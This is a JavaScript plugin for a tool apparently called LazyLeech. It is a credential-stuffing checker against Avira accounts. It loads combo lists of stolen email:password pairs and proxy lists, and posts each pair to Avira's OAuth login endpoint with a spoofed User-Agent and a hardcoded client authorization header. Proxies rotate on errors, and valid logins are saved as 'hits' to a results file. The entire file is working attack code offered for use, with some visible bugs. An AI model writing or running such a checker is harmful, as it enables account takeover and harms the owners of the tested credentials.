"use strict";

// Dependencies
const I2rys = require("../../../../LazyLeech Old/plugins/checking/avira/utils/i2rys")
const Dialogy = require("dialogy")
const Request = require("request")
const Path = require("path")
const Fs = require("fs")

// Variables
var Avira = {
    emailpass_index: 0,
    comboLength: 0,
    results: ""
}

// Main
class Plugin {
    single(baseDir, callback){
        I2rys.log("bloody", "INFO", "LazyLeech Debugger:", "Your combo file path.")
        const comboFile = Dialogy.openFile({
            filter: {
                patterns: ["*.txt"],
                description: "TXT File"
            }
        })
    
        I2rys.log("bloody", "INFO", "LazyLeech Debugger:", "Your proxies file path(LazyLeech only accepts HTTP/HTTPS Proxies).")
        const proxiesFile = Dialogy.openFile({
            filter: {
                patterns: ["*.txt"],
                description: "Proxies File"
            }
        })
    
        const combo = Fs.readFileSync(comboFile, "utf8").split("\n")
        const proxies = Fs.readFileSync(proxiesFile, "utf8").split("\n")
    
        Avira.comboLength = combo.length
        for( let i in combo ){
            if(combo[i] != ""){
                const randomProxy = Math.floor(Math.random() * proxies.length-1)
    
                checking(combo[i].split(":")[0], combo[i].split(":")[1], proxies, randomProxy)
            }else{
                Avira.comboLength = combo.length -1
            }
        }
    
        function checking(email, password, proxy_index){
            var body = { grant_type: "password", "username": email, "password": password }
            body = JSON.stringify(body)
    
            Request.post(`https://api.my.avira.com/v2/oauth/`, {
                headers: {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                    "Origin": "https://my.avira.com",
                    "Authorization": "Basic YXZpcmEvZGFzaGJvYXJkOjAyMjI4OWNjOTZhMTQwOTI4YWQ5ODNjNTJmYTRjYTNlMDZmODBkZDg5NjgwNGE0YmIxNDFkMDc2MjY2YTQ0OTA="
                },
                ignoreprotocolerrors: true,
                allowautoredirect: false,
                timeout: 5000,
                body: body,
                proxy: `http://${proxies[proxy_index]}`
            }, function(err, res, body){
                if(err){
                    if(proxy_index == proxies){
                        proxy_index = 0
                        return checking(email, password, proxy_index)
                    }
        
                    proxy_index++
                    return checking(email, password, proxy_index)
                }
        
                if(body.indexOf("device_token") != -1){
                    I2rys.log("bloody", "INFO", "LazyLeech Debugger:", `${email}:${password} is valid`)
        
                    if(Avira.results.length == 0){
                        Avira.results = `${email}:${password} is valid`
                    }else{
                        Avira.results += `\n${email}:${password} is valid`
                    }
                }else{
                    I2rys.log("bloody", "INFO", "LazyLeech Debugger:", `${email}:${password} is invalid`)
                }
        
                Avira.emailpass_index++
                if(Avira.emailpass_index == Avira.comboLength){
                    I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", "Combo checking is finished.")
                    I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", "Checking if they are any hits.")
    
                    if(Avira.results.length == 0){
                        I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", "Looks like they are no hits.")
                        callback()
                        return
                    }else{
                        const random_numbers = Math.floor(Math.random() * 999999999999)
    
                        I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", `${Avira.results.split("\n").length} hits found.`)
                        Fs.writeFileSync(`${baseDir}/results/avira_${random_numbers}.txt`, Avira.results, "utf8")
                        I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", `The results have been saved to ${baseDir}/results/avira_${random_numbers}.txt`)
                        callback()
                    }
                    return
                }
    
                return
            })
        }
    }

    multiple(resultsDir, combo, proxies, callback){
        Avira.comboLength = combo.length
        for( let i in combo ){
            if(combo[i] != ""){
                const randomProxy = Math.floor(Math.random() * proxies.length-1)
    
                checking(combo[i].split(":")[0], combo[i].split(":")[1], proxies, randomProxy)
            }else{
                Avira.comboLength = combo.length -1
            }
        }
    
        function checking(email, password, proxy_index){
            var body = { grant_type: "password", "username": email, "password": password }
            body = JSON.stringify(body)
    
            Request.post(`https://api.my.avira.com/v2/oauth/`, {
                headers: {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                    "Origin": "https://my.avira.com",
                    "Authorization": "Basic YXZpcmEvZGFzaGJvYXJkOjAyMjI4OWNjOTZhMTQwOTI4YWQ5ODNjNTJmYTRjYTNlMDZmODBkZDg5NjgwNGE0YmIxNDFkMDc2MjY2YTQ0OTA="
                },
                ignoreprotocolerrors: true,
                allowautoredirect: false,
                timeout: 5000,
                body: body,
                proxy: `http://${proxies[proxy_index]}`
            }, function(err, res, body){
                if(err){
                    if(proxy_index == proxies){
                        proxy_index = 0
                        checking(email, password, proxy_index)
                        return
                    }
        
                    proxy_index++
                    checking(email, password, proxy_index)
                    return
                }
        
                if(body.indexOf("device_token") != -1){
                    I2rys.log("bloody", "INFO", "LazyLeech Debugger:", `[Avira] ${email}:${password} is valid`)
        
                    if(Avira.results.length == 0){
                        Avira.results = `[Avira] ${email}:${password} is valid`
                    }else{
                        Avira.results += `\n[Avira] ${email}:${password} is valid`
                    }
                }else{
                    I2rys.log("bloody", "INFO", "LazyLeech Debugger:", `[Avira] ${email}:${password} is invalid`)
                }
        
                Avira.emailpass_index++
                if(Avira.emailpass_index == Avira.comboLength){
                    I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", "[Avira] Combo checking is finished.")
                    I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", "[Avira] Checking if they are any hits.")
    
                    if(Avira.results.length == 0){
                        I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", "[Avira] Looks like they are no hits.")
                        return
                    }else{
                        const random_numbers = Math.floor(Math.random() * 999999999999)
    
                        I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", `[Avira] ${Avira.results.split("\n").length} hits found.`)
                        Fs.writeFileSync(`${resultsDir}/avira_${random_numbers}.txt`, Avira.results, "utf8")
                        I2rys.log("yellowish", "INFO", "LazyLeech Debugger:", `[Avira] The results have been saved to ${resultsDir}/avira_${random_numbers}.txt`)
                    }
                    return
                }
    
                return
            })
        }
    }
}

module.exports = plugin